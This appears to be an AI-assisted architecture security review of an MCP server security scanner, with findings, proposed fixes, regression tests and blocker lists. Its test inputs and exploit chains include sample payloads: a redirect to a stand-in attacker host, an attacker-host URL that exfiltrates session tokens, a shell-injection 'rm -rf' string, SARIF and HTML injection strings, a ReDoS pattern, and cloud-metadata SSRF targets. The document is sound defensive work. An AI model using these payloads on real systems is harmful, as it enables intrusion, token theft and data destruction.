# cosai-mcp — Architecture Panel Review

**Date:** 2026-04-26
**Panel:** T1 Full (new security-critical architecture)
**Status:** CONDITIONAL PASS — 10 P0 blockers must be resolved before implementation

---

## Sonnet Panel: Correctness + Security + MCP Protocol

20 findings across three sub-panels.

### Panel A — Correctness

**FINDING 1 — CORRECTNESS — CRITICAL**
Component: Probe Isolation / "no shared state between probes"
Issue: "No shared state" is not achievable in a single Python process. Python's GIL, module-level singletons, asyncio event loop, httpx connection pools, ssl.SSLContext cached sessions, and OS-level fd tables are all implicitly shared. "Isolated context" as a separate Python dict namespace is insufficient for security isolation.
Standard: POSIX process isolation (fork+exec), seccomp-BPF, or minimum `multiprocessing.Process` with no shared memory. Industry standard for adversarial scanner probe isolation is OS-level process boundaries.
Fix: Run each probe (or threat-category batch) in a `multiprocessing.Process`. Results pass back as JSON-serialized frozen dataclasses. Update stated runtime deps; change "isolated context" language to "process-isolated."
Test: `test_regression_probe_state_isolation` — probe-1 sets a module-level sentinel; asserts probe-2 cannot observe it.

**FINDING 2 — CORRECTNESS — HIGH**
Component: Network allowlist
Issue: httpx and websockets do not provide a network-layer allowlist hook. DNS rebinding bypasses a URL-level check. TLS SNI/IP mismatch enables redirect to a different host. Without OS-level iptables/pf rules or mandatory proxy, the allowlist is an assertion, not a control.
Standard: Mandatory egress proxy with explicit allowlist (AWS CodeBuild, GitHub Actions sandbox, Snyk). Or: network namespace isolation (`unshare --net`).
Fix: (a) `follow_redirects=False` hard-coded, non-overridable. (b) Resolve `target_host` to IP at scan start; reject any connection to a different IP. (c) Docker path adds `--network=none` except for explicit target IP. (d) Document that hard guarantee requires Docker.
Test: `test_regression_network_allowlist_no_redirect` — mock target returns 302 to evil.example.com; asserts harness does not follow it and flags SUSPICIOUS.

**FINDING 3 — CORRECTNESS — HIGH**
Component: JSON template variable injection
Issue: Naive two-pass string-replace on `{{var}}` placeholders is vulnerable to second-order injection if a variable value contains `{{`. Also: substituted values containing JSON structural characters (`"`, `}`, `\n`) into a serialized JSON string produce structurally different JSON (JSON injection via template expansion).
Standard: Structured substitution — build probe payload as Python dict first, substitute into string leaf values only, then serialize. (Jinja2 sandbox, Mustache strict context.)
Fix: Template substitution occurs on the parsed Python dict, not on the JSON string. Validate that no substituted value contains `{{` after expansion (abort probe with ERROR). Enforce as invariant in catalog loader.
Test: `test_regression_template_no_double_expansion` — variable value is `{{target_url}}`; asserts no recursive expansion.
Test: `test_regression_template_no_json_injection` — variable value contains `"; "evil": true`; asserts no injected key in result.

**FINDING 4 — CORRECTNESS — HIGH**
Component: Frozen dataclass mutation
Issue: `@dataclass(frozen=True)` prevents attribute re-assignment but not mutation of mutable container values (list, dict, set). `result.errors.append(...)` works on a frozen dataclass.
Standard: `tuple` instead of `list` for all sequence fields; `types.MappingProxyType` for dict fields. (CPython ast module, attrs frozen+converter=tuple.)
Fix: Catalog schema validator converts all list/dict fields to tuple/MappingProxyType at parse time. Post-load integrity check walks the frozen dataclass tree and asserts no mutable containers.
Test: `test_regression_frozen_probe_no_list_mutation` — parses threat def with `cwe: ["CWE-74"]`; asserts `threat.cwe` is tuple; asserts `.append()` raises AttributeError.

**FINDING 5 — CORRECTNESS — MEDIUM**
Component: T12 / audit.py / DAG execution trace immutability
Issue: File-based append log is not immutable — any process with write access can truncate or overwrite. "Append-only" requires O_APPEND + chattr +a, content-addressable store, or external system.
Standard: Append-only Merkle log (Certificate Transparency, Trillian, AWS CloudTrail). Minimum viable: hash-chained log where each entry contains SHA-256 of previous entry.
Fix: `audit.py` implements a hash-chained log: `{"seq": N, "data": {...}, "prev_hash": "sha256:...", "entry_hash": "sha256:..."}`. Add `cosai audit verify` command. Document that file-level immutability requires OS controls outside scanner scope.
Test: `test_regression_audit_chain_tamper_detection` — writes 5 entries; modifies entry 3; asserts verify returns CHAIN_BROKEN at entry 4.

**FINDING 6 — CORRECTNESS — MEDIUM**
Component: T9 module scope (trust.py)
Issue: T9 ("LLM output untrusted, sanitize before re-feed") is scanner-external by nature — the scanner has no LLM. `trust.py` as scanner-internal middleware conflates middleware enforcement (controls the scanner applies to itself) with probe coverage (tests run against the target). Developers will build it wrong.
Fix: Clarify distinction: `cosai_mcp/middleware/` = controls scanner applies to itself. `trust.py` specifically = sanitize MCP responses before scanner's own processing pipeline. T9 probes live in `tests/probes/t09_trust_probes.py`. Document what T9 self-protection means for the scanner.
Test: `test_regression_t9_module_scope` — asserts no function in `trust.py` makes outbound network calls to `target_host`.

---

### Panel B — Security

**FINDING 7 — SECURITY — CRITICAL**
Component: Ed25519 trust anchor / public key distribution
Issue: If the public key ships inside the same package as the catalog files, a supply-chain attacker can replace both simultaneously, defeating signature verification entirely. Self-signed = circular trust.
Standard: Pinned public key in two independent locations: (1) hardcoded in Python source as a constant, (2) published via Sigstore/Cosign in GitHub release attestation (PEP 740). Key in source and attestation must match.
Fix: Hardcode Ed25519 public key as bytes literal in `cosai_mcp/keys.py`. `COSAI_PUBKEY` env var overrides for enterprise key rotation. Integrate Sigstore for PyPI release attestations.
Test: `test_regression_signature_tampered_catalog` — sign with wrong key; asserts `SignatureVerificationError`.
Test: `test_regression_signature_wrong_pubkey_env` — COSAI_PUBKEY set to different key; asserts verification fails.

**FINDING 8 — SECURITY — CRITICAL**
Component: `matches_regex` / ReDoS
Issue: Python `re` on catalog-sourced patterns (including custom/UNTRUSTED) causes catastrophic backtracking on adversarial patterns. Per-probe timeout may not interrupt a GIL-holding regex in CPython.
Standard: `google-re2` (linear-time, no backtracking). Used by Cloudflare WAF, Google. Industry standard for untrusted-regex evaluation.
Fix: Add `google-re2` dependency. Validate all `matches_regex` patterns at catalog load time — RE2 refuses to compile exponential patterns; treat that as `UnsafePatternError`. If RE2 unavailable, enforce pattern complexity score with reject threshold.
Test: `test_regression_redos_pattern_rejected` — catalog with `(a+)+$`; asserts `UnsafePatternError` before scan begins.
Test: `test_regression_redos_pattern_timeout` — fallback path: asserts evaluation terminates within 2× probe timeout.

**FINDING 9 — SECURITY — HIGH**
Component: SARIF output injection
Issue: SARIF is JSON, not HTML. HTML-escaping does not prevent structural SARIF injection. Malicious MCP response can inject `ruleId`, `suppressions[]`, `partialFingerprints` — suppressing real findings or creating phantom ones in GitHub's security tab. Injected `suppressions` apply repo-wide by ruleId+fingerprint.
Standard: SARIF generation via structured builder (not string interpolation). OASIS SARIF 2.1.0 section 3.11: `message.text` must be plain text.
Fix: Use `sarif-om` or equivalent schema-validated builder. Attacker content goes in exactly one field: `message.text`, plain text, length-capped, control-char-stripped. `ruleId`, `suppressions`, `fingerprints` are scanner-generated only, never derived from response content. Validate output against SARIF 2.1.0 JSON schema before writing.
Test: `test_regression_sarif_no_json_injection` — response body contains `","level":"error","ruleId":"INJECTED"`; asserts output SARIF validates against schema and contains exactly the expected result count.

**FINDING 10 — SECURITY — HIGH**
Component: `subprocess` stdio transport attack surface
Issue: If target path or args flow from catalog templates or CLI flags into `subprocess.Popen(cmd, shell=True)`: command injection. Child process inherits scanner fds (audit log) and env (COSAI_PUBKEY, API keys) unless filtered.
Standard: `subprocess.Popen` with `shell=False`, `close_fds=True`, filtered `env={}`, `start_new_session=True`. (pytest subprocess plugin, tox.)
Fix: (a) `shell=False` always; (b) `close_fds=True`; (c) `env=` minimal allowlist explicitly constructed; (d) `start_new_session=True`; (e) validate argv contains no shell metacharacters before passing.
Test: `test_regression_subprocess_no_shell_injection` — target command contains `; rm -rf /tmp/testfile` with `shell=False`; asserts OSError not shell execution.
Test: `test_regression_subprocess_env_filtered` — asserts child process cannot read `COSAI_PUBKEY`.

**FINDING 11 — SECURITY — HIGH**
Component: HTML escaping order
Issue: Escaping after template substitution is wrong. If raw response content is substituted before escaping, a crafted template structure can defeat the escaping.
Standard: Escape-on-input (OWASP Output Encoding cheat sheet, Jinja2 autoescaping, Django templates).
Fix: HTML-escape MCP response data at point of ingestion into result object (probe runner), not at report rendering. Use `html.escape(quote=True)`. Never store raw response in result objects; use separate `_raw_unsafe` field if needed.
Test: `test_regression_html_escape_before_template` — response body `<script>alert(1)</script>`; asserts HTML report contains `&lt;script&gt;`.

**FINDING 12 — SECURITY — HIGH**
Component: DPoP (RFC 9449) implementation realism
Issue: DPoP requires ES256/RS256 key pair, per-request signed JWT with `htu`, `htm`, `iat`, `jti` claims, plus `DPoP-Nonce` handling. httpx alone is insufficient. Key storage unspecified.
Standard: RFC 9449 section 4. `joserfc` or `PyJWT[crypto]` required.
Fix: Add `joserfc` or `PyJWT[crypto]` to deps. DPoP key pair is ephemeral (generated at scan start, discarded at end). Handle `DPoP-Nonce` challenge/response. Separate "scanner authenticates via DPoP" (probe auth) from "scanner tests target enforces DPoP" (T1 probe).
Test: `test_regression_dpop_proof_structure` — asserts proof JWT contains `htu`, `htm`, `iat`, `jti`.
Test: `test_regression_dpop_nonce_handled` — mock server returns `DPoP-Nonce: abc123`; asserts next request includes it in proof.

**FINDING 13 — SECURITY — MEDIUM**
Component: Report signing key management
Issue: Report-signing key unspecified. If same key as catalog, leaked key compromises both. Per-installation key with no trust model means third parties cannot verify reports.
Standard: Key separation (NIST SP 800-57). Per-installation key in OS keychain (keyring library).
Fix: Two key types: (1) catalog verification (hardcoded public, per Finding 7); (2) report signing (per-installation, OS keychain via `keyring`). Report embeds public key fingerprint.
Test: `test_regression_report_signature_verifiable` — signed report; asserts verifier using only embedded fingerprint can verify without private key.

**FINDING 14 — SECURITY — MEDIUM**
Component: Custom catalog execution boundary
Issue: "UNTRUSTED" label in report is a reporting concern, not a security control. Custom catalog files execute with full scanner privileges.
Fix: `--allow-custom-catalog` flag required to enable custom catalog execution (off by default). `matches_regex` disabled in custom catalogs unless `--allow-regex-in-custom` also set. Document custom catalog as third-party code.
Test: `test_regression_custom_catalog_disabled_by_default` — invoked without flag; asserts custom catalog not loaded even if present.

---

### Panel C — MCP Protocol Fidelity

**FINDING 15 — MCP-PROTOCOL — CRITICAL**
Component: MCP initialization lifecycle
Issue: MCP spec (2024-11-05 and 2025-03-26) requires mandatory `initialize`/`initialized` handshake before any other messages. Servers MUST reject `tools/call` before initialization completes. Every probe will fail against compliant servers before the security test runs.
Standard: MCP specification section 3.1 (Lifecycle).
Fix: Add `MCPSession` abstraction that executes `initialize`/`initialized` before any probes. Negotiate `protocolVersion` (support 2024-11-05 and 2025-03-26 minimum). Store advertised capabilities in session object. "Server rejects initialization" is itself a security signal (T1/T7).
Test: `test_regression_initialize_before_tools_call` — asserts harness sends `initialize` and receives valid response before any `tools/call`.
Test: `test_regression_protocol_version_negotiation` — mock server supports 2024-11-05 only; asserts scanner negotiates to that version.

**FINDING 16 — MCP-PROTOCOL — CRITICAL**
Component: Transport — HTTP+SSE deprecated
Issue: MCP spec 2025-03-26 replaced HTTP+SSE with Streamable HTTP (single endpoint, returns direct JSON or text/event-stream depending on request, optional `Mcp-Session-Id` header). Building primary HTTP transport against SSE means the scanner fails against modern MCP servers.
Standard: MCP spec 2025-03-26 Transports section.
Fix: Implement `StreamableHTTPTransport` as primary HTTP transport. Keep `LegacySSETransport` for backward compat with 2024-11-05 servers. Transport autodetection via `initialize` response `protocolVersion`.
Test: `test_regression_streamable_http_transport` — mock server uses Streamable HTTP; asserts scanner completes handshake and `tools/list`.
Test: `test_regression_transport_fallback_sse` — server returns `protocolVersion: "2024-11-05"`; asserts fallback to SSE.

**FINDING 17 — MCP-PROTOCOL — HIGH**
Component: `tools/list` prerequisite
Issue: MCP spec requires `tools/list` before meaningful `tools/call`. Calling `tools/call` with an unknown tool name hits "unknown tool" rejection before the injection payload reaches the validation path being tested.
Fix: `tools/list` as part of `MCPSession` initialization. Cache tool manifest. T3/T4 probes iterate over discovered tools. Add "tool manifest anomalies" probe category for T6 (new tool since last scan = shadowing signal).
Test: `test_regression_tools_list_before_call` — asserts `tools/list` is called and stored before any `tools/call` probe.
Test: `test_regression_probe_uses_discovered_tools` — server advertises `"read_file"` only; asserts probes target `"read_file"` not literal `"{{tool_name}}"`.

**FINDING 18 — MCP-PROTOCOL — HIGH**
Component: WebSocket transport — not in MCP spec
Issue: WebSocket is not in MCP spec (2024-11-05 or 2025-03-26). Was discussed but not adopted. Implementing it wastes effort and creates false coverage claims.
Fix: Remove WebSocket from planned transports unless evidence of significant adoption. If retained, mark `unofficial=True`; scan results using it marked `TRANSPORT_UNOFFICIAL`.
Test: `test_regression_websocket_transport_marked_unofficial` — asserts class metadata includes `unofficial=True`.

**FINDING 19 — MCP-PROTOCOL — MEDIUM**
Component: Scanner capability declaration accuracy
Issue: If scanner declares capabilities it does not implement (e.g., `sampling`), a compliant server may send back requests the scanner cannot handle, leaving the connection undefined.
Fix: Declare minimal accurate `clientInfo` (`name: "cosai-mcp-scanner"`, `version`) and only implemented capabilities. Unhandled server requests return JSON-RPC `-32601 Method not found`.
Test: `test_regression_client_capabilities_accurate` — mock server sends `sampling/createMessage`; asserts scanner returns -32601 not hang.

**FINDING 20 — MCP-PROTOCOL — MEDIUM**
Component: Error code granularity in assertions
Issue: `{"target": "response.error", "operator": "eq", "value": true}` does not distinguish error codes. T3 injection-rejection probes need to verify `-32602` (Invalid params), not `-32603` (Internal error, which could mean injection succeeded and crashed the server).
Fix: Extend assertion schema to support `response.error.code` and `response.error.message` as targets. Add `error_code_in` to operator enum. T3 probes assert `response.error.code` is in invalid-params range.
Test: `test_regression_error_code_assertion` — probe asserts `response.error.code eq -32602`; mock returns `-32603`; asserts probe result is FAIL.

---

## Opus Adversary Panel

7 findings.

**ADVERSARY FINDING 1 — VIABLE**
Scenario: Malicious MCP Server → SARIF injection into GitHub Security tab
Exploit chain: Attacker-controlled MCP server returns crafted `error.message` containing SARIF-poisoning payload with `suppressions[]` injected by ruleId+fingerprint. GitHub SARIF replace-by-category semantics means scanner's upload suppresses unrelated real findings repo-wide.
Blast radius: Scanner launders attacker-chosen "clean" status into victim's GitHub Security tab. Suppresses real findings repo-wide. Inverts the tool's security value across every adopter.
Architectural fix: Scanner constructs SARIF from fixed internal schema. Attacker bytes go in exactly one field: `message.text` (plain, length-capped, control-char-stripped). `ruleId`, `suppressions`, `partialFingerprints` are scanner-generated only, never derived from response content.

**ADVERSARY FINDING 2 — VIABLE**
Scenario: Malicious MCP Server → outbound SSRF via redirects
Exploit chain: httpx default follows redirects. Target returns 307 to `169.254.169.254` (AWS IMDS) or internal Vault. SSE keeps socket open; server streams redirect sentinels. In CI: link-local metadata hands out OIDC token.
Blast radius: Cloud metadata exfiltration, internal network recon from inside victim CI, OIDC token theft.
Architectural fix: `follow_redirects=False` hard-coded. Allowlist enforced at socket connect time via custom httpx transport (resolve once, pin IP, reject any connect to different IP). Block RFC1918, link-local, loopback, IPv6 ULA by default. `trust_env=False` (blocks HTTP_PROXY injection).

**ADVERSARY FINDING 3 — VIABLE**
Scenario: stdio transport → scanner code execution
Exploit chain: If subprocess args/env flow from catalog templates, `shell=True` + unescaped `{{tool_name}}` = command injection on developer laptop or CI runner. Malicious server emits gigabytes on stderr to OOM scanner, or emits NUL/terminal escapes that corrupt CI logs (fake "all clean" line in plain-text output).
Blast radius: RCE on developer laptops and CI runners. From CI: secrets, source write access, supply-chain pivot.
Architectural fix: `shell=False` always. Argv is fixed list — no template substitution into argv or env. `close_fds=True`, minimal env, stderr/stdout size-capped (10MB), line-length-capped, control-char-stripped. stdio transport disabled in CI mode by default.

**ADVERSARY FINDING 4 — VIABLE**
Scenario: Catalog poisoning — ReDoS, probe destination exfil, path traversal, provenance confusion
Exploit chain:
- ReDoS: `matches_regex` with Python re + adversarial pattern = scanner hangs.
- Exfil: if catalog controls any URL field in a probe, `"url": "https://attacker.tld/{{session_id}}"` exfiltrates session token.
- Path traversal: `references: ["javascript:..."]` or `file:///etc/passwd` rendered as `<a href>` in HTML report = XSS/local-file disclosure.
- Provenance confusion: custom dir file with content claiming "official" provenance fabricates authoritative findings.
Blast radius: DoS, session token exfil, XSS in shared reports, false-finding fabrication.
Architectural fix: `google-re2` for `matches_regex`. Probe destination is CLI-only, never catalog-controlled. HTML report `references` rendered as text; URLs allowed only if scheme ∈ {http, https}, with `rel="noopener noreferrer"` + CSP `default-src 'none'`. Provenance derived from load path, not JSON field.

**ADVERSARY FINDING 5 — VIABLE**
Scenario: CI weaponization — fail-open + secret exfil
Exploit chain: Scanner crashes (OOM, malformed JSON, RemoteProtocolError); exits 0; `fail_on: critical` sees no findings reported; step passes; merge proceeds. Or: scanner times out, partial SARIF uploaded, replaces prior scan's findings with incomplete set (GitHub SARIF replace-by-category). Scanner process inherits full env including `GITHUB_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, `AWS_*`; any config logging that dumps env leaks them.
Blast radius: False clean ships. Token exfil → repo write → supply-chain pivot.
Architectural fix: Distinct exit codes — `0` clean, `1` findings ≥ threshold, `2` scanner-internal-error (fail-closed), `3` target-unreachable. Partial SARIF sets `invocation.executionSuccessful: false`. Scanner runs with scrubbed env (`PATH` + `COSAI_*` only, no `*_TOKEN`, `*_KEY`, cloud creds). GitHub Action sets `permissions: contents: read, security-events: write` only.

**ADVERSARY FINDING 6 — PARTIAL (mechanism-class)**
Scenario: Black-box probes miss state-machine and multi-turn threats
Structural gap: T7 (session security), T9 (trust boundary), T12 (logging) are stateful and multi-turn. One-shot black-box probes cannot detect:
- Session fixation requiring legitimate-then-attacker turn ordering.
- Tool-shadowing (T6) that activates only after mid-session re-fetch of tool list.
- Confused deputy (T2) requiring upstream-token + downstream-call chain.
- Indirect prompt injection (T4) requiring LLM-in-the-loop to evaluate whether response steered a model.
- T12 requires observing the agent's behavior, not the server's — scanner is on the wrong side of the boundary.
Blast radius: Whole-category false-clean. Worst failure mode for a security tool.
Architectural fix (mechanism-class): Split into three engines:
1. **Black-box prober** — T1, T3, T8, T10 (current design, valid here)
2. **Stateful conformance harness** — T2, T6, T7 (full `initialize` + multi-turn scripted scenarios)
3. **Middleware instrumentation** — T4, T9, T12 (the middleware IS the test; detection requires being in the call path)
README coverage matrix must be honest about which engine covers which category.

**ADVERSARY FINDING 7 — VIABLE**
Scenario: Supply chain — PyPI + Ed25519 bootstrap
Exploit chain: PyPI account takeover or typosquat ships malicious release with attacker-controlled Ed25519 key. Key and catalog in same wheel = self-verifying signatures are theater. GitHub Action `@v1` tag is mutable — compromised org re-points tag; every CI using the Action runs attacker code with `security-events: write`.
Blast radius: Universal. Every CI using the Action.
Architectural fix: Sigstore/PEP 740 attestations for PyPI releases, verified at install time. Ed25519 public key published via Sigstore Rekor + DNS TXT; verifier requires ≥2 sources. GitHub Action consumed by commit SHA only in published examples. Reproducible builds + SLSA L3 provenance.

---

## Consolidated P0 Blockers

Must be resolved in architecture before writing any code:

| # | Source | Issue |
|---|--------|-------|
| 1 | AF-1, F-9 | SARIF construction model: attacker bytes in one field only, structural fields scanner-generated |
| 2 | AF-2, F-2 | Socket-level allowlist: IP pinned at resolve, `follow_redirects=False`, `trust_env=False`, RFC1918/link-local blocked |
| 3 | AF-3, F-10 | stdio transport hardening: `shell=False`, no template substitution into argv/env, scrubbed env, output size-capped |
| 4 | AF-4, F-8 | `google-re2` for `matches_regex`; probe destination CLI-only, never catalog-controlled |
| 5 | AF-5 | Fail-closed exit codes: `2=scanner-error` (fail-closed); partial SARIF sets `executionSuccessful: false`; scrubbed env |
| 6 | AF-7, F-7 | Ed25519 bootstrap: key hardcoded as bytes literal in source + Sigstore/PEP 740; no self-verifying key |
| 7 | F-15 | MCP `initialize`/`initialized` handshake mandatory before any probe; missing → `scan-incomplete` not `clean` |
| 8 | F-16 | Streamable HTTP as primary transport; SSE as legacy fallback for 2024-11-05 servers |
| 9 | AF-6 | Architecture split: prober + stateful harness + middleware instrumentation; coverage matrix in README |
| 10 | F-1 | Probe isolation: `multiprocessing.Process`; results as JSON-serialized frozen dataclasses |

## P1 (before v1.0)

- F-17: `tools/list` before `tools/call` in session init
- F-3: Structured template substitution (dict-first, not string-first)
- F-4: `tuple`/`MappingProxyType` for frozen dataclass containers
- F-11: HTML escape at ingestion, not at render time
- F-12: `joserfc`/`PyJWT[crypto]` for DPoP; ephemeral key pair; nonce handling
- F-14: `--allow-custom-catalog` flag; custom catalog disabled by default

## Verdict

**CONDITIONAL PASS.** Architecture is coherent in intent and correctly maps the threat landscape. Ten P0 blockers must be resolved before implementation begins.

**Mechanism-class verdict (Opus):** Black-box JSON-RPC probing is the right model for T1, T3, T8, T10. It is structurally wrong for T4, T9, T12 (LLM-in-loop / agent-side observation required). T2, T6, T7 need a stateful multi-turn harness. The architecture must split into three engines and the README coverage matrix must be honest about which category each covers.
